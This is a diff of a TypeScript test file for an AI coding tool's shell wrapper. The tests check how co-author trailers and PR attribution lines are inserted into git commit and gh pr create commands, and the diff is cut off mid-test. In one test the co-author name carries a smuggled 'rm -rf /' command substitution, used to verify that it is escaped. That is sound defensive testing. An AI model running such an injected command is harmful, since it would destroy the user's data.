-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // git's `-m` can be passed multiple times — `git interpret-trailers`
-      // only recognises trailers that sit at the end of the *last* `-m`
-      // value, so the rewrite must target the last match.
+      // `git interpret-trailers` only recognises trailers at the end of the
+      // *last* `-m`, so the rewrite targets the last match.
       it('should add Co-authored-by trailer to the LAST -m when multiple are present', async () => {
-        const command = 'git commit -m "Title" -m "Body line 1"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        // The trailer must land inside the second `-m` quote pair, not
-        // the first; a simple way to assert this is that `Body line 1`
-        // and the trailer share the same closing quote.
+        const observed = await spawnedCommand(
+          'git commit -m "Title" -m "Body line 1"',
+        );
+        // `Body line 1` and the trailer share the second `-m`'s closing quote.
         expect(observed).toMatch(
           /-m\s+"Body line 1\s+Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud\.com>"/s,
         );
@@ -6086,516 +3844,104 @@ describe('ShellTool', () => {
         expect(observed).toMatch(/-m\s+"Title"\s/);
       });
 
-      // Concern: a literal `-m '...'` *inside* a quoted commit
-      // message body could be picked up by the regex as if it were a
-      // real later argument, splicing the trailer mid-message and
-      // breaking the command's quoting.
+      // A literal `-m '...'` inside the quoted body could be taken for a later
+      // argument, splicing the trailer mid-message and breaking the quoting.
       it('should not be fooled by a literal -m token inside the quoted message body', async () => {
-        const command =
-          'git commit -m "docs mention -m \'flag\' for completeness"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        // The original message body must be preserved end-to-end —
-        // no trailer spliced before its closing quote.
+        const observed = await spawnedCommand(
+          'git commit -m "docs mention -m \'flag\' for completeness"',
+        );
+        // The body survives intact; the trailer lands after it, just before
+        // the outer closing quote.
         expect(observed).toContain(
           "-m \"docs mention -m 'flag' for completeness",
         );
-        // The trailer must land AFTER the original body, just before
-        // the message's outer closing quote.
         expect(observed).toMatch(
           /docs mention -m 'flag' for completeness\s+Co-authored-by:[^"]+"/s,
         );
       });
 
-      // Concern: a later `git tag -m "..."` in the same compound
-      // command could be mistaken for the commit message because the
-      // regex was matching across the whole command string.
+      // A later `git tag -m "..."` in the same compound was mistaken for the
+      // commit message when the regex matched across the whole command.
       it('should target the commit message, not a later git tag -m in the same chain', async () => {
-        const command =
-          'git commit -m "fix" && git tag -a v1 -m "release notes"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        // The trailer is appended to the commit message body...
+        const observed = await spawnedCommand(
+          'git commit -m "fix" && git tag -a v1 -m "release notes"',
+        );
         expect(observed).toMatch(/git commit -m "fix\s+Co-authored-by:[^"]+"/s);
-        // ...and the later `git tag -m` is left exactly as the user
-        // wrote it.
+        // The tag annotation is left exactly as written, no trailer spliced in.
         expect(observed).toContain('git tag -a v1 -m "release notes"');
-        // The tag annotation must not have a trailer spliced in.
         const tagMatch = observed.match(/git tag .*-m "([^"]*)"/);
         expect(tagMatch?.[1]).toBe('release notes');
       });
 
-      // The tool description recommends `git commit -m "$(cat <<'EOF'
-      // ... EOF)"` for multi-line messages. The body contains nested
-      // `"` from interior shell tokens — the regex would match only
-      // up to the first interior quote and splice the trailer
-      // mid-substitution, breaking the command. Bail explicitly.
+      // The tool description recommends `git commit -m "$(cat <<'EOF' ...
+      // EOF)"`; its nested `"` would make the regex splice the trailer
+      // mid-substitution and break the command, so it bails.
       it('should NOT rewrite -m bodies that contain $(...) command substitution', async () => {
         const command =
           'git commit -m "$(cat <<\'EOF\'\nfix: title\n\ndetails\nEOF\n)"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
+        const observed = await spawnedCommand(command);
         // The original command must reach the executor unchanged.
         expect(observed).toBe(command);
         expect(observed).not.toContain('Co-authored-by:');
       });
 
-      // `--message` is git's documented long alias for `-m`. Without
-      // explicit handling the trailer would be silently skipped on
-      // commits that use the long form.
-      it('should add co-author for git commit --message "..."', async () => {
-        const command = 'git commit --message "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should add co-author for git commit --message="..."', async () => {
-        const command = 'git commit --message="Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should add co-author when git commit is prefixed with sudo', async () => {
-        const command = 'sudo git commit -m "Test"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // Quoted "git commit" should not look like an executed commit.
-      it('should NOT add co-author when git commit appears only inside quoted text', async () => {
-        const command = 'echo "git commit -m foo"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // Bash's apostrophe-via-`'\''` form (close-escape-reopen) is a
-      // single logical body. The trailer must land at the FINAL
-      // closing `'` — not in the middle of the escape — so the regex
-      // body group has to recognise the escape sequence as a whole.
+      // Bash's `'\''` (close-escape-reopen) form is one logical body: the
+      // trailer lands at the FINAL closing `'`, not inside the escape.
       // Mirrors the bodySinglePattern in addAttributionToPR.
       it("should append trailer after the final ' in -m 'don'\\''t' apostrophe-escape", async () => {
-        const command = "git commit -m 'don'\\''t'";
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        // The full apostrophe-escape body survives intact and the
-        // trailer lands AFTER it (before the closing `'`), not in the
-        // middle of `'\''`.
+        const observed = await spawnedCommand("git commit -m 'don'\\''t'");
         expect(observed).toMatch(
           /git commit -m 'don'\\''t[\s\S]*Co-authored-by:[^']*'/,
         );
       });
 
-      it('should add co-author to git commit with multi-line message', async () => {
-        const command = `git commit -m "Fix bug
-
- This is a detailed description
- spanning multiple lines"`;
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
-          ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // Bash accepts `-mfoo` as well as `-m foo`. The previous regex
-      // required at least one whitespace and silently no-op'd on the
-      // shorthand form, so users who used `git commit -m"msg"` got no
-      // co-author trailer.
-      it('should add co-author to git commit -m"msg" shorthand (no space)', async () => {
-        const command = 'git commit -m"Quick fix"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
-          ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // Without escaping, a co-author name containing `$()`, backticks,
-      // or `"` would either break the user-approved `git commit` command
-      // or be evaluated as command substitution.
+      // Unescaped `$()`, backticks or `"` in the co-author name would break
+      // the user-approved `git commit` or run as command substitution.
       it('should escape shell metacharacters in name/email', async () => {
-        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
-          commit: true,
-          pr: true,
-          name: 'Bot $(rm -rf /) `eval` "danger"',
-          email: 'bot@example.com',
-        });
+        setCoAuthor('Bot $(rm -rf /) `eval` "danger"');
 
-        const command = 'git commit -m "msg"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observedCmd = mockShellExecutionService.mock.calls[0][0];
-        // Each metacharacter must be escaped, not literal.
-        expect(observedCmd).toContain('\\$');
-        expect(observedCmd).toContain('\\`');
-        expect(observedCmd).toContain('\\"');
-        // The `-m "..."` quote pair must stay closed.
+        const observedCmd = await spawnedCommand('git commit -m "msg"');
+        // Each metacharacter is escaped, and the `-m "..."` pair stays closed.
+        expectText(observedCmd, ['\\$', '\\`', '\\"']);
         expect(observedCmd).toMatch(/-m\s+".+"/s);
       });
 
       describe('attachCommitAttribution note failure warning', () => {
-        // The warning the note-write catch branch appends is the only bound
-        // on that text once the scheduler's error gate stands down for the
-        // marked body (the identity comparison happens after the appends, so
-        // it never sees the growth). The exception text is capped at 120
-        // chars; the full cause stays in the debug log.
+        // Once the scheduler's error gate stands down for the marked body (its
+        // identity check runs after the appends, so it never sees the growth),
+        // this warning is the only bound on that text: the exception text is
+        // capped at 120 chars, the full cause stays in the debug log.
         it('caps the note-failure exception text at 120 characters', async () => {
-          const preSha = 'a'.repeat(40);
-          const postSha = 'b'.repeat(40);
           const longMessage = `notes exploded: ${'x'.repeat(300)}`;
+          const result = await commitWithNoteFailure(longMessage);
 
-          // attachCommitAttribution's git probes go through childProcess.execFile:
-          // HEAD moved (pre -> post) and exactly one commit landed.
-          mockExecFile.mockImplementation(
-            (
-              _file: unknown,
-              args: unknown,
-              _options: unknown,
-              callback: (
-                error: Error | null,
-                stdout: string,
-                stderr: string,
-              ) => void,
-            ) => {
-              const argv = args as string[];
-              const joined = argv.join(' ');
-              const respond =
-                joined === 'rev-parse HEAD'
-                  ? `${postSha}\n`
-                  : joined.startsWith('rev-list --count')
-                    ? '1\n'
-                    : null;
-              queueMicrotask(() =>
-                respond === null
-                  ? callback(
-                      new Error(`unexpected git call: ${joined}`),
-                      '',
-                      '',
-                    )
-                  : callback(null, respond, ''),
-              );
-              return { on: vi.fn() };
-            },
-          );
-
-          // The diff analysis goes through the (mocked) ShellExecutionService:
-          // the main commit command gets the deferred result, the runGit
-          // probes get canned per-subcommand output.
-          mockShellExecutionService.mockImplementation((cmd: string) => {
-            if (cmd.startsWith('git commit')) {
-              return {
-                pid: 12345,
-                result: new Promise<ShellExecutionResult>((resolve) => {
-                  resolveExecutionPromise = resolve;
-                }),
-              };
-            }
-            const output = cmd.includes('rev-parse --verify')
-              ? `${preSha}\n`
-              : cmd.includes('log -1 --pretty=%P')
-                ? `${preSha}\n`
-                : cmd.includes('rev-parse --show-toplevel')
-                  ? '/test/dir\n'
-                  : cmd.includes('--name-only')
-                    ? 'file.txt\n'
-                    : cmd.includes('--name-status')
-                      ? 'M\tfile.txt\n'
-                      : cmd.includes('--numstat')
-                        ? '1\t0\tfile.txt\n'
-                        : '';
-            return {
-              pid: 12345,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(output),
-                output,
-                exitCode: 0,
-                signal: null,
-                error: null,
-                aborted: false,
-                pid: 12345,
-                executionMethod: 'child_process',
-              } as ShellExecutionResult),
-            };
-          });
-
-          // Stub the attribution singleton's surface so the commit has one
-          // AI-touched file to attribute (the mocked `crypto` in this file
-          // makes the real recordEdit's hashing unusable), then make the note
-          // payload build throw with an over-long message so the catch branch
-          // produces the warning.
-          const attributionService = CommitAttributionService.getInstance();
-          vi.spyOn(attributionService, 'hasAttributions').mockReturnValue(true);
-          vi.spyOn(attributionService, 'matchCommittedFiles').mockReturnValue(
-            new Set(['/test/dir/file.txt']),
-          );
-          vi.spyOn(
-            attributionService,
-            'generateNotePayload',
-          ).mockImplementation(() => {
-            throw new Error(longMessage);
-          });
-
-          const invocation = shellTool.build({
-            command: 'git commit -m "x"',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          await vi.waitFor(() =>
-            expect(mockShellExecutionService).toHaveBeenCalled(),
-          );
-          resolveExecutionPromise({
-            rawOutput: Buffer.from(''),
-            output: '',
-            exitCode: 0,
-            signal: null,
-            error: null,
-            aborted: false,
-            pid: 12345,
-            executionMethod: 'child_process',
-          });
-          const result = await promise;
-
-          expect(String(result.llmContent)).toContain(
-            `AI attribution note skipped: ${longMessage.slice(0, 120)}.`,
-          );
-          expect(String(result.llmContent)).not.toContain(
-            longMessage.slice(0, 200),
-          );
-          expect(String(result.returnDisplay)).toContain(
-            `AI attribution note skipped: ${longMessage.slice(0, 120)}.`,
-          );
-          expect(String(result.returnDisplay)).not.toContain(
-            longMessage.slice(0, 200),
-          );
+          for (const text of [
+            String(result.llmContent),
+            shellResultText(result.returnDisplay),
+          ]) {
+            expectText(
+              text,
+              [`AI attribution note skipped: ${longMessage.slice(0, 120)}.`],
+              [longMessage.slice(0, 200)],
+            );
+          }
         });
       });
     });
 
     describe('addAttributionToPR', () => {
-      // Non-inline-body flows: `--body-file <path>` reads the body
-      // from a file on disk, `--fill` populates it from commit
-      // messages, and bare `gh pr create` opens an editor. None of
-      // these have a body argv we can splice the attribution into.
-      // We can't safely modify them automatically (would either
-      // mutate the user's file on disk or break the editor flow),
-      // so we leave the command untouched and rely on the debug
-      // warning to surface the skip when QWEN_DEBUG_LOG_FILE is set.
+      const ATTRIBUTION = 'Generated with Qwen Code';
+      const runPr = (command: string) =>
+        spawnedCommand(command, { waitForSpawn: true });
+      const lastSpawnedCommand = () => {
+        const calls = mockShellExecutionService.mock.calls;
+        return calls[calls.length - 1]?.[0] as string;
+      };
+
+      // `--body-file` (a file), `--fill` (commit messages) and bare `gh pr
+      // create` (editor) have no body argv; rewriting would mutate the user's
+      // file or break the editor flow, so the command is left untouched and a
+      // debug warning (QWEN_DEBUG_LOG_FILE) surfaces the skip.
       it.each([
         ['--body-file', 'gh pr create --title "x" --body-file /tmp/body.md'],
         ['--fill', 'gh pr create --title "x" --fill'],
@@ -6603,63 +3949,43 @@ describe('ShellTool', () => {
       ])(
         'should leave gh pr create %s unchanged (non-inline-body flow)',
         async (_label, command) => {
-          const invocation = shellTool.build({ command, is_background: false });
-          const promise = invocation.execute(mockAbortSignal);
-
-          await vi.waitFor(() =>
-            expect(mockShellExecutionService).toHaveBeenCalled(),
-          );
-          resolveExecutionPromise({
-            rawOutput: Buffer.from(''),
-            output: '',
-            exitCode: 0,
-            signal: null,
-            error: null,
-            aborted: false,
-            pid: 12345,
-            executionMethod: 'child_process',
-          });
-
-          await promise;
-
-          const observed = mockShellExecutionService.mock.calls[0][0] as string;
+          const observed = await runPr(command);
           expect(observed).toBe(command);
-          expect(observed).not.toContain('Generated with Qwen Code');
+          expect(observed).not.toContain(ATTRIBUTION);
         },
       );
 
-      // `gh pr new` is a documented alias for `gh pr create`. Without
-      // explicit alias handling the rewrite silently misses it.
-      it('should append attribution to `gh pr new --body "..."` (alias form)', async () => {
-        const command = 'gh pr new --title "x" --body "Summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Generated with Qwen Code'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
+      it.each<[string, string, boolean]>([
+        ...rowsOf(true, {
+          // `gh pr new` is a documented alias for `gh pr create`, and `-b` for
+          // `--body`; without explicit handling the rewrite silently misses
+          // them.
+          'should append attribution to `gh pr new --body "..."` (alias form)':
+            'gh pr new --title "x" --body "Summary"',
+          'should append attribution to gh pr create -b "..." (short form)':
+            'gh pr create --title "x" -b "Summary"',
+          'should append attribution to gh pr create --body when pr enabled':
+            'gh pr create --title "x" --body "Summary"',
+          // `gh --repo owner/repo pr create` shifts pr/create past the fixed
+          // `tokens[1]/tokens[2]` slots a literal-position check looks at.
+          'should append attribution when gh has global flags before pr create':
+            'gh --repo owner/repo pr create --title "x" --body "Summary"',
+          // The common `--body=value` form; the old `\s+` separator missed it.
+          'should append attribution to --body="..." equals-sign form':
+            'gh pr create --title "x" --body="Summary"',
+        }),
+        // Quoted "gh pr create" should not look like an executed PR command.
+        [
+          'should NOT rewrite when gh pr create appears only inside quoted text',
+          'echo "gh pr create --title x --body \\"Summary\\""',
           false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
+        ],
+      ])('%s', async (_title, command, attributed) => {
+        await runPr(command);
+        expectSpawned(
+          attributed
+            ? expect.stringContaining(ATTRIBUTION)
+            : expect.not.stringContaining(ATTRIBUTION),
         );
       });
 
@@ -6668,128 +3994,33 @@ describe('ShellTool', () => {
       it('should NOT rewrite --body that contains $(...) command substitution', async () => {
         const command =
           'gh pr create --title "x" --body "$(cat <<\'EOF\'\nSummary\nEOF\n)"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
+        const observed = await runPr(command);
         expect(observed).toBe(command);
-        expect(observed).not.toContain('Generated with Qwen Code');
+        expect(observed).not.toContain(ATTRIBUTION);
       });
 
-      // `-b` is gh's documented short alias for `--body`. Without
-      // explicit handling the rewrite would silently miss it.
-      // `curl -b "session=abc" && gh pr create --body "summary"` —
-      // without segment scoping the body regex would match curl's
-      // `-b` cookie flag (since it's the same `-b "..."` shape) and
-      // inject attribution into the cookie value, breaking curl.
+      // Without segment scoping the body regex would match curl's same-shaped
+      // `-b "..."` cookie flag and inject attribution there, breaking curl.
       it('should NOT match -b in earlier non-gh segments of a compound', async () => {
-        const command =
-          'curl -b "session=abc" https://example.com && gh pr create --title "x" --body "summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
+        const observed = await runPr(
+          'curl -b "session=abc" https://example.com && gh pr create --title "x" --body "summary"',
         );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        // curl's -b cookie value must be exactly preserved.
+        // curl's cookie is preserved; the trailer lands in gh's --body.
         expect(observed).toContain('curl -b "session=abc"');
-        // The trailer should land in gh's --body, not in curl's -b.
         expect(observed).toMatch(
           /gh pr create --title "x" --body "summary[\s\S]*Generated with Qwen Code"/,
         );
       });
 
-      it('should append attribution to gh pr create -b "..." (short form)', async () => {
-        const command = 'gh pr create --title "x" -b "Summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Generated with Qwen Code'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // A `-b 'flag'` mention literally inside the outer `--body "..."`
-      // text must NOT be picked as the body argument: the trailer
-      // would land mid-body, corrupting the user-approved command.
-      // Mirrors addCoAuthorToGitCommit's nested-match check.
+      // A `-b 'flag'` mention inside the outer `--body "..."` must not be taken
+      // as the body: the trailer would land mid-body, corrupting the approved
+      // command. Mirrors addCoAuthorToGitCommit's nested-match check.
       it('should pick the OUTER --body when an inner -b appears in body text', async () => {
-        const command =
-          'gh pr create --title "x" --body "docs mention -b \'flag\' here"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
+        await runPr(
+          'gh pr create --title "x" --body "docs mention -b \'flag\' here"',
         );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
-
-        const calls = mockShellExecutionService.mock.calls;
-        const cmd = calls[calls.length - 1]?.[0] as string;
-        // The trailer must appear AFTER the closing `"` of the outer
-        // body, not between `flag` and `here`.
+        const cmd = lastSpawnedCommand();
+        // After the outer body's closing `"`, not between `flag` and `here`.
         expect(cmd).toMatch(
           /--body "docs mention -b 'flag' here[\s\S]*Generated with Qwen Code"/,
         );
@@ -6798,177 +4029,18 @@ describe('ShellTool', () => {
         );
       });
 
-      it('should append attribution to gh pr create --body when pr enabled', async () => {
-        const command = 'gh pr create --title "x" --body "Summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Generated with Qwen Code'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // gh CLI uses the *last* `--body` flag when multiple are
-      // provided. Splicing into the first one would silently drop
-      // attribution. Mirrors the matchAll/last-match behaviour in
-      // addCoAuthorToGitCommit.
+      // gh uses the *last* `--body`; splicing into the first silently drops
+      // attribution. Mirrors addCoAuthorToGitCommit's last-match behaviour.
       it('should target the LAST --body when gh pr create has multiple', async () => {
-        const command =
-          'gh pr create --title "x" --body "ignored" --body "real summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
+        await runPr(
+          'gh pr create --title "x" --body "ignored" --body "real summary"',
         );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
-
-        const calls = mockShellExecutionService.mock.calls;
-        const cmd = calls[calls.length - 1]?.[0] as string;
+        const cmd = lastSpawnedCommand();
         expect(cmd).toMatch(
           /--body "ignored" --body "real summary[\s\S]*Generated with Qwen Code/,
         );
-        // The trailer must NOT be inside the first --body.
         expect(cmd).not.toMatch(
           /--body "ignored[\s\S]*Generated with Qwen Code[\s\S]*" --body/,
-        );
-      });
-
-      // `gh --repo owner/repo pr create` shifts pr/create past the
-      // fixed `tokens[1]/tokens[2]` slots; a literal-position check
-      // misses these forms.
-      it('should append attribution when gh has global flags before pr create', async () => {
-        const command =
-          'gh --repo owner/repo pr create --title "x" --body "Summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Generated with Qwen Code'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // The `--body=value` (equals-sign) form is common with gh; the
-      // earlier `\s+` separator only matched `--body value`.
-      it('should append attribution to --body="..." equals-sign form', async () => {
-        const command = 'gh pr create --title "x" --body="Summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Generated with Qwen Code'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // Quoted "gh pr create" should not look like an executed PR command.
-      it('should NOT rewrite when gh pr create appears only inside quoted text', async () => {
-        const command = 'echo "gh pr create --title x --body \\"Summary\\""';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
